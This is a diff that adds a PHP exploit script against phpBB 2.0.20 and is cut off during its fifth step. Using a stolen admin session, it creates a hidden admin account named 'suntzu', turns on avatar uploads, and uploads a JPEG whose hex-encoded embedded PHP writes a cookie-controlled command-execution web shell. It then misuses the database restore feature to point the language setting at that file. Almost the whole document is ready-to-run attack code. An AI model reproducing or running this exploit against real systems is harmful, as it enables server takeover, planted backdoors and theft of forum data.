@@ -1,0 +1,916 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo "PhpBB <= v2.0.20 \"Admin/Restore Database/default_lang remote commands execution\r\n";
+echo "by rgod rgod@autistici.org\r\n";
+echo "site: http://retrogod.altervista.org\r\n";
+echo "-> you need an admin sid, works regardless of magic_quotes_gpc settings\r\n";
+echo "tested and working against a fresh PhpBB installation\r\n\r\n";
+
+if ($argc<5) {
+echo "Usage: php ".$argv[0]." host path sid cmd OPTIONS\r\n";
+echo "host:       target server (ip/hostname)\r\n";
+echo "path:       path to PhpBB\r\n";
+echo "sid:        session id\r\n";
+echo "cmd:        a shell command\r\n";
+echo "Options:\r\n";
+echo "   -p[port]:    specify a port other than 80\r\n";
+echo "   -P[ip:port]: specify a proxy\r\n";
+echo "Examples:\r\n";
+echo "php ".$argv[0]." localhost /phpbb/ 8db5cef976c7e0f51c25c92152b56881 cat config.php\r\n";
+echo "php ".$argv[0]." localhost /phpbb/ 8db5cef976c7e0f51c25c92152b56881 ls -la -p81\r\n";
+echo "php ".$argv[0]." localhost / 8db5cef976c7e0f51c25c92152b56881 ls -la -P1.1.1.1:80\r\n\r\n";
+die;
+}
+
+/* explaination:
+
+  if you have admin session id, you can enable avatar uploads, if not activated
+  yet and you can store an arbitrary path for "default_lang" inside phpbb_config
+  database table using the "Database Restore" feature. So you can upload a
+  malicious avatar with php code as EXIF metadata content and submit a query like
+  this:
+
+  UPDATE phpbb_config SET config_value=CONCAT("english/../../images/avatars/297984465bc277af10.jpg",CHAR(0)) where config_name="default_lang";
+
+  note: you can see avatar filename in profile page
+
+  in faq.php, like in other files, near line 62, we have:
+
+  ...
+  include($phpbb_root_path . 'language/lang_' . $board_config['default_lang'] . '/' . $lang_file . '.' . $phpEx);
+  ...
+
+  $board_config['default_lang'] var is not sanitized before to be used
+  to include files, so you can reach the malicious avatar to execute the code
+  inside of it.
+
+  This tool also creates a "suntzu" user with password "suntzu" and a backdoor
+  called suntzu.php, so you do not need sid after the first run
+								              */
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  #debug
+  #echo "\r\n".$html;
+
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$cmd="";$port=80;$proxy="";
+for ($i=4; $i<=$argc-1; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P"))
+{$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+$cmd=urlencode($cmd);
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+
+
+echo "step 0 -> check if suntzu.php is already installed...\r\n";
+$packet ="GET ".$p."suntzu.php HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: cmd=".$cmd.";\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+if (strstr($html,"56789"))
+{
+  echo "Exploit succeeded...\r\n";
+  $temp=explode("56789",$html);
+  die("\r\n".$temp[1]."\r\n");
+}
+
+echo "Step 0b -> check if exploit has already succeeded but suntzu.php deleted, try to login as suntzu...\r\n";
+$data="username=suntzu";
+$data.="&password=suntzu";
+$data.="&redirect=".urlencode("admin/index.php?admin=1");
+$data.="&admin=1";
+$data.="&login=Log+in";
+$packet="POST ".$p."login.php HTTP/1.0\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
+$packet.="Referer: http://".$host.$path."/login.php\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cache-Control: no-cache\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+$temp=explode("Set-Cookie: ",$html);
+$temp2=explode(" ",$temp[3]);
+$cookie=$temp2[0];
+$temp2=explode(" ",$temp[4]);
+$cookie.=" ".$temp2[0];
+$temp=explode("admin=1&sid=",$html);
+$temp2=explode("\n",$temp[1]);
+$session_id=trim($temp2[0]);
+if (($cookie=='') | ($session_id=='')) {
+echo "step 0c -> query database to create a \"suntzu\" user with password \"suntzu\"...\r\n";
+$session_id=trim($argv[3]);
+//usually admin user_id is "2", so you need only session id... however, if you have admin cookie, specify it literally
+$cookie="phpbb2mysql_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D; phpbb2mysql_sid=";
+$cookie.=$session_id.";";
+$sql="
+#
+# let's create a new admin user
+#
+
+INSERT INTO phpbb_users(user_id,user_active,username,user_password,user_level,user_email) VALUES ('999999','1','suntzu','d33d57efba4c05808b5d16532f9d1567','1','suntzu\@fakemail.com');
+
+";
+
+$data='-----------------------------7d62702f250530
+Content-Disposition: form-data; name="backup_file"; filename="suntzu.sql";
+Content-Type: text/plain
+
+'.$sql.'
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="perform"
+
+restore
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="restore_start"
+
+Start Restore
+-----------------------------7d62702f250530--
+';
+
+$packet="POST ".$p."admin/admin_db_utilities.php?sid=".$session_id." HTTP/1.0\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
+$packet.="Referer: http://".$host.$path."profile.php?mode=editprofile\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d62702f250530\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cache-Control: no-cache\r\n";
+$packet.="Cookie: ".$cookie."\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+if (eregi("The Database has been successfully restored",$html))
+{
+echo "Done...\r\n";
+}
+else
+{
+die("Unable to modify table... maybe wrong admin sid\r\n");
+}
+}
+else
+{
+echo "Cookie ->".$cookie."\r\n";
+echo "sid ->".urlencode($session_id)."\r\n\r\n";
+}
+
+echo "Step 1 -> Login as suntzu...\r\n";
+$data="username=suntzu";
+$data.="&password=suntzu";
+$data.="&redirect=".urlencode("admin/index.php?admin=1");
+$data.="&admin=1";
+$data.="&login=Log+in";
+$packet="POST ".$p."login.php HTTP/1.0\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
+$packet.="Referer: http://".$host.$path."/login.php\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cache-Control: no-cache\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+$temp=explode("Set-Cookie: ",$html);
+$temp2=explode(" ",$temp[3]);
+$cookie=$temp2[0];
+$temp2=explode(" ",$temp[4]);
+$cookie.=" ".$temp2[0];
+echo "Cookie ->".$cookie."\r\n";
+$temp=explode("admin=1&sid=",$html);
+$temp2=explode("\n",$temp[1]);
+$session_id=trim($temp2[0]);
+echo "sid ->".urlencode($session_id)."\r\n\r\n";
+if (($cookie=='') | ($session_id=='')) {die("Unable to login...");}
+
+echo "step 2 -> enable avatar uploads, if not enabled yet...\r\n";
+$data='-----------------------------7d62702f250530
+Content-Disposition: form-data; name="server_name"
+
+'.$host.'
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="server_port"
+
+'.$port.'
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="script_path"
+
+'.$path.'
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="sitename"
+
+yourdomain.com
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="site_desc"
+
+A _little_ text to describe your forum
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="board_disable"
+
+0
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="require_activation"
+
+0
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="enable_confirm"
+
+0
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="allow_autologin"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="max_autologin_time"
+
+0
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="board_email_form"
+
+0
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="flood_interval"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="search_flood_interval"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="max_login_attempts"
+
+99
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="login_reset_time"
+
+30
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="topics_per_page"
+
+50
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="posts_per_page"
+
+15
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="hot_threshold"
+
+25
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="default_style"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="override_user_style"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="default_lang"
+
+english
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="default_dateformat"
+
+D M d, Y g:i a
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="board_timezone"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="gzip_compress"
+
+0
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="prune_enable"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="cookie_domain"
+
+
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="cookie_name"
+
+phpbb2mysql
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="cookie_path"
+
+/
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="cookie_secure";
+
+0
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="session_length"
+
+3600
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="privmsg_disable"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="max_inbox_privmsgs"
+
+50
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="max_sentbox_privmsgs"
+
+25
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="max_savebox_privmsgs"
+
+50
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="max_poll_options"
+
+50
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="allow_html"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="allow_html_tags"
+
+b,i,u,pre
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="allow_bbcode"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="allow_smilies"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="smilies_path"
+
+images/smiles
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="allow_sig"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="max_sig_chars"
+
+255
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="allow_namechange"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="allow_avatar_local"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="allow_avatar_remote"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="allow_avatar_upload"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="avatar_filesize"
+
+6144
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="avatar_max_height"
+
+100
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="avatar_max_width"
+
+100
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="avatar_path"
+
+images/avatars
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="avatar_gallery_path"
+
+images/avatars/gallery
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="coppa_fax"
+
+
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="coppa_mail"
+
+
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="board_email"
+
+
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="board_email_sig"
+
+Thanks, The Suntzu S.p.A.
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="smtp_delivery"
+
+0
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="smtp_host"
+
+
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="smtp_username"
+
+
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="smtp_password"
+
+
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="submit"
+
+Submit
+----------------------------7d62702f250530--
+';
+
+$packet="POST ".$p."admin/admin_board.php?sid=".$session_id." HTTP/1.0\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
+$packet.="Referer: http://".$host.$path."admin/admin_board.php?sid=".$session_id."\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d62702f250530\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cache-Control: no-cache\r\n";
+$packet.="Cookie: ".$cookie."\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+if (eregi("Forum Configuration Updated Successfully",$html))
+{
+echo "Done...\r\n";
+}
+else
+{echo("Unable to modify configuration...");}
+
+echo "step 3 -> upload an avatar with php code as EXIF metadata content...\r\n";
+$avatar=
+chr(0xff).chr(0xd8).chr(0xff).chr(0xfe).chr(0x01).chr(0x07).chr(0x3c).chr(0x3f).
+chr(0x70).chr(0x68).chr(0x70).chr(0x0d).chr(0x0a).chr(0x24).chr(0x66).chr(0x70).
+chr(0x3d).chr(0x66).chr(0x6f).chr(0x70).chr(0x65).chr(0x6e).chr(0x28).chr(0x22).
+chr(0x73).chr(0x75).chr(0x6e).chr(0x74).chr(0x7a).chr(0x75).chr(0x2e).chr(0x70).
+chr(0x68).chr(0x70).chr(0x22).chr(0x2c).chr(0x22).chr(0x77).chr(0x22).chr(0x29).
+chr(0x3b).chr(0x0d).chr(0x0a).chr(0x66).chr(0x70).chr(0x75).chr(0x74).chr(0x73).
+chr(0x28).chr(0x24).chr(0x66).chr(0x70).chr(0x2c).chr(0x22).chr(0x3c).chr(0x3f).
+chr(0x70).chr(0x68).chr(0x70).chr(0x20).chr(0x65).chr(0x72).chr(0x72).chr(0x6f).
+chr(0x72).chr(0x5f).chr(0x72).chr(0x65).chr(0x70).chr(0x6f).chr(0x72).chr(0x74).
+chr(0x69).chr(0x6e).chr(0x67).chr(0x28).chr(0x30).chr(0x29).chr(0x3b).chr(0x73).
+chr(0x65).chr(0x74).chr(0x5f).chr(0x74).chr(0x69).chr(0x6d).chr(0x65).chr(0x5f).
+chr(0x6c).chr(0x69).chr(0x6d).chr(0x69).chr(0x74).chr(0x28).chr(0x30).chr(0x29).
+chr(0x3b).chr(0x69).chr(0x66).chr(0x20).chr(0x28).chr(0x67).chr(0x65).chr(0x74).
+chr(0x5f).chr(0x6d).chr(0x61).chr(0x67).chr(0x69).chr(0x63).chr(0x5f).chr(0x71).
+chr(0x75).chr(0x6f).chr(0x74).chr(0x65).chr(0x73).chr(0x5f).chr(0x67).chr(0x70).
+chr(0x63).chr(0x28).chr(0x29).chr(0x29).chr(0x20).chr(0x7b).chr(0x5c).chr(0x24).
+chr(0x5f).chr(0x43).chr(0x4f).chr(0x4f).chr(0x4b).chr(0x49).chr(0x45).chr(0x5b).
+chr(0x63).chr(0x6d).chr(0x64).chr(0x5d).chr(0x3d).chr(0x73).chr(0x74).chr(0x72).
+chr(0x69).chr(0x70).chr(0x73).chr(0x6c).chr(0x61).chr(0x73).chr(0x68).chr(0x65).
+chr(0x73).chr(0x28).chr(0x5c).chr(0x24).chr(0x5f).chr(0x43).chr(0x4f).chr(0x4f).
+chr(0x4b).chr(0x49).chr(0x45).chr(0x5b).chr(0x63).chr(0x6d).chr(0x64).chr(0x5d).
+chr(0x29).chr(0x3b).chr(0x7d).chr(0x65).chr(0x63).chr(0x68).chr(0x6f).chr(0x20).
+chr(0x35).chr(0x36).chr(0x37).chr(0x38).chr(0x39).chr(0x3b).chr(0x70).chr(0x61).
+chr(0x73).chr(0x73).chr(0x74).chr(0x68).chr(0x72).chr(0x75).chr(0x28).chr(0x5c).
+chr(0x24).chr(0x5f).chr(0x43).chr(0x4f).chr(0x4f).chr(0x4b).chr(0x49).chr(0x45).
+chr(0x5b).chr(0x63).chr(0x6d).chr(0x64).chr(0x5d).chr(0x29).chr(0x3b).chr(0x65).
+chr(0x63).chr(0x68).chr(0x6f).chr(0x20).chr(0x35).chr(0x36).chr(0x37).chr(0x38).
+chr(0x39).chr(0x3b).chr(0x3f).chr(0x3e).chr(0x22).chr(0x29).chr(0x3b).chr(0x0d).
+chr(0x0a).chr(0x66).chr(0x63).chr(0x6c).chr(0x6f).chr(0x73).chr(0x65).chr(0x28).
+chr(0x24).chr(0x66).chr(0x70).chr(0x29).chr(0x3b).chr(0x0d).chr(0x0a).chr(0x63).
+chr(0x68).chr(0x6d).chr(0x6f).chr(0x64).chr(0x28).chr(0x22).chr(0x73).chr(0x75).
+chr(0x6e).chr(0x74).chr(0x7a).chr(0x75).chr(0x2e).chr(0x70).chr(0x68).chr(0x70).
+chr(0x22).chr(0x2c).chr(0x37).chr(0x37).chr(0x37).chr(0x29).chr(0x3b).chr(0x0d).
+chr(0x0a).chr(0x3f).chr(0x3e).chr(0xff).chr(0xe0).chr(0x00).chr(0x10).chr(0x4a).
+chr(0x46).chr(0x49).chr(0x46).chr(0x00).chr(0x01).chr(0x01).chr(0x01).chr(0x00).
+chr(0x48).chr(0x00).chr(0x48).chr(0x00).chr(0x00).chr(0xff).chr(0xdb).chr(0x00).
+chr(0x43).chr(0x00).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0xff).chr(0xdb).chr(0x00).chr(0x43).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0xff).
+chr(0xc0).chr(0x00).chr(0x11).chr(0x08).chr(0x00).chr(0x01).chr(0x00).chr(0x01).
+chr(0x03).chr(0x01).chr(0x11).chr(0x00).chr(0x02).chr(0x11).chr(0x01).chr(0x03).
+chr(0x11).chr(0x01).chr(0xff).chr(0xc4).chr(0x00).chr(0x14).chr(0x00).chr(0x01).
+chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
+chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x08).
+chr(0xff).chr(0xc4).chr(0x00).chr(0x14).chr(0x10).chr(0x01).chr(0x00).chr(0x00).
+chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
+chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0xff).chr(0xc4).
+chr(0x00).chr(0x15).chr(0x01).chr(0x01).chr(0x01).chr(0x00).chr(0x00).chr(0x00).
+chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
+chr(0x00).chr(0x00).chr(0x00).chr(0x08).chr(0x09).chr(0xff).chr(0xc4).chr(0x00).
+chr(0x14).chr(0x11).chr(0x01).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
+chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
+chr(0x00).chr(0x00).chr(0x00).chr(0xff).chr(0xda).chr(0x00).chr(0x0c).chr(0x03).
+chr(0x01).chr(0x00).chr(0x02).chr(0x11).chr(0x03).chr(0x11).chr(0x00).chr(0x3f).
+chr(0x00).chr(0x23).chr(0x94).chr(0x09).chr(0x2e).chr(0xff).chr(0xd9).chr(0x00);
+
+/*
+this image has this code inside as EXIF metadata content
+<?php
+$fp=fopen("suntzu.php","w");
+fputs($fp,"<?php error_reporting(0);set_time_limit(0);if (get_magic_quotes_gpc()) {\$_COOKIE[cmd]=stripslashes(\$_COOKIE[cmd]);}echo 56789;passthru(\$_COOKIE[cmd]);echo 56789;?>");
+fclose($fp);
+chmod("suntzu.php",777);
+?>
+*/
+
+$data='-----------------------------7d62702f250530
+Content-Disposition: form-data; name="username"
+
+suntzu
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="email"
+
+suntzu@fakemail.com
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="cur_password"
+
+
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="new_password"
+
+
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="password_confirm"
+
+
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="icq"
+
+
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="aim"
+
+
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="msn"
+
+
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="yim"
+
+
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="website"
+
+
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="location"
+
+
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="occupation"
+
+
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="interests"
+
+
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="signature"
+
+suntzu giving you the pain
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="viewemail"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="hideonline"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="notifyreply"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="notifypm"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="popup_pm"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="attachsig"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="allowbbcode"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="allowhtml"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="allowsmilies"
+
+1
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="language"
+
+italian
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="style"
+
+1047
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="timezone"
+
+2
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="dateformat"
+
+D M d, Y g:i a
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+100000
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="avatar"; filename="whatever.jpeg";
+Content-Type: image/pjpeg
+
+'.$avatar.'
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="avatarurl"
+
+
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="avatarremoteurl"
+
+
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="mode"
+
+editprofile
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="agreed"
+
+true
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="coppa"
+
+0
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="user_id"
+
+999999
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="current_email"
+
+
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="submit"
+
+Submit
+-----------------------------7d62702f250530--
+';
+
+$packet="POST ".$p."profile.php HTTP/1.0\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
+$packet.="Referer: http://".$host.$path."profile.php?mode=editprofile\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d62702f250530\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cache-Control: no-cache\r\n";
+$packet.="Cookie: ".$cookie."\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+sleep(1);
+
+echo "step 4 -> retrieve new filename for avatar from profile page...\r\n";
+$packet="GET ".$p."profile.php?mode=editprofile HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: ".$cookie."\r\n\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+$temp=explode("images/avatars/",$html);
+$temp2=explode("\"",$temp[1]);
+$avatar_name=$temp2[0];
+echo "avatar filename -> ".$avatar_name."\r\n";
+if ($avatar_name=='') {die("Unable to retrieve filename...");}
+
+echo "step 5 -> replace default_lang value in phpbb_config table with our path to shell, breaking path with a null char...\r\n";
+$sql='
+#
+# our path to avatar, using a null char to break the path
+#
+
+UPDATE phpbb_config SET config_value=CONCAT("english/../../images/avatars/'.$avatar_name.'",CHAR(0)) where config_name="default_lang";
+
+';
+
+$data='-----------------------------7d62702f250530
+Content-Disposition: form-data; name="backup_file"; filename="suntzu.sql";
+Content-Type: text/plain
+
